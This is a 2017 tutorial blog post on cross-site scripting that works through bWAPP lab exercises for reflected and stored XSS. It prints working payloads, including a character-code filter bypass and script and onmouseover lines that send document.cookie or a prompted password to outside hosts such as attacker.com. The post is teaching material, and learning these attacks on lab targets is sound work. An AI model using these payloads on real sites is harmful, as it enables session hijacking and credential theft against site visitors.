title: Cross Site Scripting (XSS)
date: 2017-05-03
image: xss.jpg

XSS is the most common web application security flaw. XSS flaws occur when an application includes user supplied data in a page sent to the browser without properly validating or escaping that content. The three known types of XSS vulnerabilities that we will cover are:
* Reflected XSS
* Stored XSS
* DOM Based XSS

### Javascript
The magic behind XSS attacks is the Javascript language. Javascript is the browser's language, and as such, whenever you have a webpage, you try to use javascripts to make it do what you want it do it.
To demonstrate this, you can simply open up your favorite browser (I prefer chrome) and access the console in the developer tools. *In chrome, just right click anywhere, and select inspect. Now click the console tab.*
In the console you can execute any piece of javascript you want to for testing purposes. However, it won't actually impact anyone else. Try executing the following:

    console.log('Does this even work?');
    alert('I am a bAd@$$ H@cK3r');


### Reflected XSS
Let's get started with BwaPP's 'XSS - Reflected (GET)/(POST)' exercise.
The form on the page asks us to provide a first and last name. It takes what you enter in those fields and prints into out on the page. What we can do with this is try to get that output to compromise other users using javascript.

In these exercises we are going to be using GET request exploits. So we will edit the inputs directly in the GET url.

Let's first test to see whether it will render any javascript we enter into the field. Enter the following into the last name field. You can enter anything you want into the first name field for now. Add the following to the end of your GET url.

    ?firstname=simeon&lastname=kakpovi<script>alert("hello")</script>

You should get a popup window on your screen with the word "hello".

If this works, it means the page will evaluate whatever javascript we submit inthe form. We can use that to steal an authenticated user's credentials for example.

    kakpovi<script>alert(document.cookie)</script>

Suppose the developed put something in place to prevent us from submitting javascript elements we can have the page evaluate our command in javascript based on each character's byte value.

    ?firstname=simeon&lastname
    =<script>alert(String.fromCharCode(77,77,69,32,114,48,99,107,115,33))</script>


We can also redirect the user to different website of our desire.

    ?firstname=simeon&lastname=
    <script>window.location= "http://www.simeonkakpovi.com";</script>

Although this may seem benign, it really gets malicious when you send the user's credentials also with it. The receiving website could parse the credentials without you ever knowing.


    <script>window.location="http://simeonkakpovi.com?cookie="+document.cookie;</script>


Alternatively, we can paste a link or image on the page which would take some action when the user clicks or hovers over it.


    <a onmouseover='alert("you’ve been pwned")’>Kakpovi</a>



### Stored XSS

In a stored XSS attack, the input is actually displayed to all other users that visit the site. Take for example a blog, or a comment section.

The following examples could be used to compromise visiting users.


    <a onmouseover="alert('just kidding, youve been pwned')">Hello I am
    just an innocent comment</a>



    <a href=“youtube.com” onmouseover='window.location="http://simeonkakpovi.com
    ?content="+document.cookie'>Hello I am just an innocent comment</a>



    <script>alert("We need your password!");password=prompt("Enter
    password...","");document.location="http://attacker.com/catch.php
    ?password="+encodeURI(password);</script>
